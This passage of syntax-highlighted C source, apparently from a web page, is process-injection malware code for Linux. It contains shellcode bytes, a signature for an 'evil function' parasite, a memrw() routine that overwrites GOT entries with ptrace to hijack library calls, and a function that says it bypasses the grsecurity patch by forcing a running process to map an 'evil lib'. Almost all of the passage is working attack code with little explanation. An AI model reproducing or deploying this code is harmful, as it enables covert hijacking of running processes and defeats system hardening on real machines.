&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>18<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>d2<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>14<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>04<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>20<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>08<span style="color: #000099; font-weight: bold;">\x</span>07<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>0c<span style="color: #000099; font-weight: bold;">\x</span>02<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>44"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>10<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>54<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>14<span style="color: #000099; font-weight: bold;">\x</span>b8<span style="color: #000099; font-weight: bold;">\x</span>5a<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>e3<span style="color: #000099; font-weight: bold;">\x</span>cd<span style="color: #000099; font-weight: bold;">\x</span>80<span style="color: #000099; font-weight: bold;">\x</span>cc"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>e8<span style="color: #000099; font-weight: bold;">\x</span>c0<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>2f<span style="color: #000099; font-weight: bold;">\x</span>6c<span style="color: #000099; font-weight: bold;">\x</span>69<span style="color: #000099; font-weight: bold;">\x</span>62<span style="color: #000099; font-weight: bold;">\x</span>2f<span style="color: #000099; font-weight: bold;">\x</span>6c<span style="color: #000099; font-weight: bold;">\x</span>69<span style="color: #000099; font-weight: bold;">\x</span>62<span style="color: #000099; font-weight: bold;">\x</span>74<span style="color: #000099; font-weight: bold;">\x</span>65<span style="color: #000099; font-weight: bold;">\x</span>73"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>74<span style="color: #000099; font-weight: bold;">\x</span>2e<span style="color: #000099; font-weight: bold;">\x</span>73<span style="color: #000099; font-weight: bold;">\x</span>6f<span style="color: #000099; font-weight: bold;">\x</span>2e<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>2e<span style="color: #000099; font-weight: bold;">\x</span>30<span style="color: #000099; font-weight: bold;">\x</span>00"</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* the signature for our evil function in our shared object */</span> <br>
<span style="color: #808080; font-style: italic;">/* we use the first 8 bytes of our function code */</span><br>
<span style="color: #808080; font-style: italic;">/* make sure this is modified based on your parasite (evil function) */</span> <br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> evilsig<span style="color: black;">[</span><span style="color: black;">]</span> = <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>55<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>e5<span style="color: #000099; font-weight: bold;">\x</span>83<span style="color: #000099; font-weight: bold;">\x</span>ec<span style="color: #000099; font-weight: bold;">\x</span>18<span style="color: #000099; font-weight: bold;">\x</span>c6<span style="color: #000099; font-weight: bold;">\x</span>45"</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* here is the signature for our transfer code, this will vary */</span><br>
<span style="color: #808080; font-style: italic;">/* depending on whether or not you use a function pointer or a */</span><br>
<span style="color: #808080; font-style: italic;">/* movl/jmp sequence. The one below is for a function pointer */</span><br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> tc<span style="color: black;">[</span><span style="color: black;">]</span> = <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>45<span style="color: #000099; font-weight: bold;">\x</span>fc<span style="color: #000099; font-weight: bold;">\x</span>00"</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* &nbsp;Our memrw() function serves three purposes<br>
&nbsp;1. modify .got entry with replacement function<br>
&nbsp;2. patch transfer code within replacement function<br>
&nbsp;3. read from any text memory location in process<br>
*/</span><br>
<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> evil_base;<br>
<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> memrw<span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *buf, <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> vaddr, <span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> size, <span style="color: #993333;">int</span> pid, <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> new<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j, data;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> ret;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> ptr = vaddr;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* get the memory address of the function to hijack */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>size == MODIFY_GOT &amp;&amp; !buf<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Modifying GOT(%x)<span style="color: #000099; font-weight: bold;">\n</span>"</span>, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; original = <span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">)</span>ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ret = ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, vaddr, new<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">)</span>ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span>&nbsp; &nbsp; &nbsp; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">(</span>size == INJECT_TRANSFER_CODE<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Injecting %x at 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, new, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, vaddr, new<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; vaddr --;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">2</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>vaddr + j<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>i<span style="color: black;">]</span> = data;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j += <span style="color: #cc66cc;">4</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Reading from process image at 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>, j = <span style="color: #cc66cc;">0</span>; i &lt; size; i+= <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>uint32_t<span style="color: black;">)</span>, j++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* PTRACE_PEEK can return -1 on success, check errno */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">(</span><span style="color: black;">(</span><span style="color: black;">(</span>data = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, vaddr + i<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span> &amp;&amp; errno<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j<span style="color: black;">]</span> = data;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> i;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* bypass grsec patch that prevents code injection into text */</span><br>
<span style="color: #993333;">int</span> grsec_mmap_library<span style="color: black;">(</span><span style="color: #993333;">int</span> pid<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> &nbsp;user_regs_struct reg;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> eip, esp, <span style="color: #993333;">string</span>, offset, str,<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax, ebx, ecx, edx, orig_eax, data;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> syscall;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j = <span style="color: #cc66cc;">0</span>, ret, status, fd;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> library_string<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> orig_ds<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> buf<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span> = <span style="color: black;">{</span><span style="color: #cc66cc;">0</span><span style="color: black;">}</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> tmp<span style="color: black;">[</span><span style="color: #cc66cc;">8192</span><span style="color: black;">]</span>, *mem;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> open_done = <span style="color: #cc66cc;">0</span>, mmap_done = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> sysenter = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr *ehdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Phdr *phdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> libfd;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> stat lst;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> text_offset, text_length, data_offset, data_length;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>libfd = open<span style="color: black;">(</span>EVILLIB_FULLPATH, O_RDONLY<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"open"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>fstat<span style="color: black;">(</span>libfd, &amp;lst<span style="color: black;">)</span> &lt; <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"fstat"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; mem = mmap<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span>, lst.<span style="color: #202020;">st_size</span>, PROT_READ, MAP_PRIVATE, libfd, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>mem == MAP_FAILED<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"mmap"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ehdr = <span style="color: black;">(</span>Elf32_Ehdr *<span style="color: black;">)</span>mem;<br>
&nbsp; &nbsp; &nbsp; &nbsp; phdr = <span style="color: black;">(</span>Elf32_Phdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_phoff<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_phnum; i-- &gt; <span style="color: #cc66cc;">0</span>; phdr++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>phdr-&gt;p_type == PT_LOAD &amp;&amp; phdr-&gt;p_offset == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; text_offset = phdr-&gt;p_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; text_length = phdr-&gt;p_filesz;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; phdr++;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data_offset = phdr-&gt;p_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data_length = phdr-&gt;p_filesz;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; strcpy<span style="color: black;">(</span>library_string, EVILLIB_FULLPATH<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* backup first part of data segment which will use for a string and some vars */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; memrw <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>orig_ds, data_segment, strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span><span style="color: #cc66cc;">+32</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* store our string for our evil lib there */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>library_string + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* verify we have the correct string */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span>; i+= <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span>&amp;buf<span style="color: black;">[</span>i<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strcmp<span style="color: black;">(</span>buf, EVILLIB_FULLPATH<span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Verified string is stored in DS: %s<span style="color: #000099; font-weight: bold;">\n</span>"</span>, buf<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"String was not properly stored in DS: %s<span style="color: #000099; font-weight: bold;">\n</span>"</span>, buf<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SYSCALL, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ebx = reg.<span style="color: #202020;">ebx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ecx = reg.<span style="color: #202020;">ecx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; edx = reg.<span style="color: #202020;">edx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; eip = reg.<span style="color: #202020;">eip</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; esp = reg.<span style="color: #202020;">esp</span>; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> syscall_eip = reg.<span style="color: #202020;">eip</span> - <span style="color: #cc66cc;">20</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* this gets sysenter dynamically incase its randomized */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!static_sysenter<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>tmp, syscall_eip, <span style="color: #cc66cc;">20</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">20</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!<span style="color: black;">(</span>i % <span style="color: #cc66cc;">10</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%.2x "</span>, tmp<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i<span style="color: black;">]</span> == 0x0f &amp;&amp; tmp<span style="color: black;">[</span>i + <span style="color: #cc66cc;">1</span><span style="color: black;">]</span> == 0x34<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter = syscall_eip + i;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
